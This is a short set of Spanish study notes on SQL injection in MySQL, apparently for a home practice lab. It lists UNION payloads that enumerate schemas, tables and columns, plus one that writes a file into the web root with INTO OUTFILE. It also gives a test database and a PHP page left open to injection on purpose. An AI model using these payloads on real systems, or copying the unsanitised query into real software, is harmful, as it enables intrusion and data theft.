# SQL Injection

En esta pagina se recopila todo lo que se vaya haciendo para SQLi.

## MySQL

### Listar bbdd

~~~sql
' union select schema_name,null from information_schema.schemata
~~~

### Listar tablas

~~~sql
' union select table_name,null from information_schema.tables where table_schema='products'-- -
~~~

### Listar columnas

~~~sql
' union select column_name,null from information_schema.columns where table_schema='products' and table_name='users'-- -
~~~

### Insertar fichero

~~~sql
union select 'hola' into outfile '/var/www/html/prueba.txt'-- -
~~~

## Creación de BBDD de pruebas en local

```sql
create database pruebasdb;
use pruebasdb;
create table users(id int(32),username varchar(32),nombre varchar(150), password varchar(32));
insert into users(id, username, nombre, password) values(1, 'jamunoz', 'Juanito', 'Juanito123+');
insert into users(id, username, nombre, password) values(2, 'pepito', 'Pepito Grillo', 'pePItoELgrillo');
insert into users(id, username, nombre, password) values(3, 'manolito', 'Manolito Gafotas', 'ManoloElDelBombo2023');

create user 'jamunoz'@'localhost' identified by 'Juan123';
grant all privileges on pruebasdb.* to 'jamunoz'@'localhost';
```

## Creación de fichero php vulnerable a SQLi

```php
<?php

$server = "localhost";
$username = "jamunoz";
$password = "Juan123";
$database = "pruebasdb";

// Conexion a BBDD
$conn = new mysqli($server, $username, $password, $database);

$id = $_GET['id'];

$data = mysqli_query($conn, "select nombre from users where id = '$id'");

$response = mysqli_fetch_array($data);

echo $response['nombre'];

?>

```